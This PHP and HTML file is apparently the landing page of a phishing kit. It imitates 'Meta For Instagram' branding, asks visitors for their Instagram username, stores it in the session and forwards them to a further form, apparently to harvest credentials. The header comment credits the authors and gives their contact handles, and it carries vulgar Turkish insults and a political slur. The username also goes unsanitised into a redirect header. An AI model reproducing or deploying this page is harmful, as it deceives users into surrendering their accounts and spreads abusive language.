<?php
error_reporting(0);
include ("app/config.php");
include ("app/database/router.php");
include ("app/database/yazilar.php");
/*------------------------------------------------
BU SCRİPT SPEX KODIR TARAFINDAN YAPILMISTIR
CALANIN YADA BENIM DIYEN OROSPU EVLATLARININ
ANNESINI BACISIYLA EK OLARAK SIKEYIM
AMINA KOYDUGUM AKP'Lİ KÖPEKLERİ SPEX ANNENİZİ
SİKER....
-----------------------------------------------
   - SpeX - Santa Rose - Zero - Pegasus - 
-----------------------------------------------
  Contact : ig->@spexcoder / tg->@spexmarka 
-----------------------------------------------
*/


if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: form.php?username=$username");
}



    

?>
<!DOCTYPE html>
<html>
<head>
  <?php include ("app/tag/main/meta.php"); ?>
  <!-- Css ve svg vs vs -->
  <link rel="stylesheet" type="text/css" href="assets/theme/spexblue/spex.css">
  <link rel="stylesheet" type="text/css" href="assets/css/spexui.css">
  <!-- Spex kodır hekır ustun bılmem ne iste -->
  
</head>
<body>


<!-- Navbar başlat -->
<div class="">
  <div class="row">

    <div class="col-12">
      <nav
        class="navbar navbar-expand-lg blur border-radius-xl position-absolute my-3 top-0 border-bottom py-3 z-index-3 shadow my-3 py-2 start-0 end-0 mx-4">
         <img src="assets/img/metainc.png" width="80">
        <div class="container">

          <a class="navbar-brand" href="https://www.instagram.com/meta/" rel="tooltip" title="Meta For Instagram" data-placement="bottom" target="_blank">
          <b>Meta For Instagram
          </b></a>
          
           
         
          <div class="collapse navbar-collapse w-100 pt-3 pb-2 py-lg-0" id="navigation">
            <ul class="navbar-nav navbar-nav-hover mx-auto">
             
               
            </ul>

            <ul class="navbar-nav d-lg-block d-none">
              <li class="nav-item">
                
               
                
              </li>
            </ul>
          </div>
        </div>
      </nav>
  </div>
  </div></div>
<!-- navbar son -->
<section>
  <div class="container py-8">
    <div class="row">
      <div class="col-lg-7 mx-auto d-flex justify-content-center flex-column"><br>
        <div class="card d-flex justify-content-center p-4 shadow-lg"><br>
          <div class="text-center"><br>
            <b><h3 class="text-gradient text-info"><?php echo $homebaslik;?></h3></b>

            <p class="mb-0"><b>
            <?php echo $homeyazi; ?>
           </b> </p>
          </div>
          <div class="card card-plain">
              <div class="card-body pb-2">
                <div class="row">
                  <div class="col-md-6">
                    <div class="input-group input-group-static mb-4">
                    </div>
                  </div>
                  <form method="get">
                 <div class="row">
                    <div class="col-lg-4 mx-auto">
                      <input type="text" placeholder="Username" name="username" class="form-control is-valid" required>
                    </div>
                  </div>
                  <div class="row">
                  <div class="col-md-12 text-center"><br>
                    <button type="submit" class="btn bg-gradient-info">Continue</button>
                  </div>
                </form>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>



</div>
</div>
</div>

<!-- Scripts Bootstrap vs iste spexkodır-->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
<!-- @spexcoder - @spexmarka - @spexcrusher -->
</body>
</html>